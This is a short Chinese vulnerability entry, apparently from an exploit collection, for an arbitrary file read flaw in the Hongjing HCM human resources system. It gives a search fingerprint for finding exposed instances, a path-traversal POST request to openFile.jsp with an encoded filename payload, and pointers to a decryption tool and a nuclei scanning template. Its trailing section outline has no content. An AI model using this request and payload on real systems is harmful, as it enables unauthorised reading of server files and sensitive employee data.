# 宏景人力资源信息管理系统openFile存在任意文件读取漏洞

- **系统**：宏景人力资源信息管理系统　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="宏景 HCM"`
- **请求**：`POST /templates/attestation/../../general/muster/hmuster/openFile.jsp HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 160`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
filename=8uHo1M8Ok6bZ468mKmzw7xWCzPAATTP2HJBPAATTP8j8sjHiBmsb9ThhDsrcV8PAATTP2HJBPAATTPG67rw8nTSnppHAL6UwTPAATTP2HJBPAATTPZPAATTP2HJBPAATTP9x5w4PAATTP3HJDPAATTP

文件读取路径加解密工具\
\[Mosaic-hongjing-tools-1.0-SNAPSHOT-jar-with-dependencies.jar]\(公众号：渗透安全HackTwo\

nuclei脚本\
\[Hongjing-templates-wenjianduqu.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 宏景人力资源信息管理系统openFile存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 宏景人力资源信息管理系统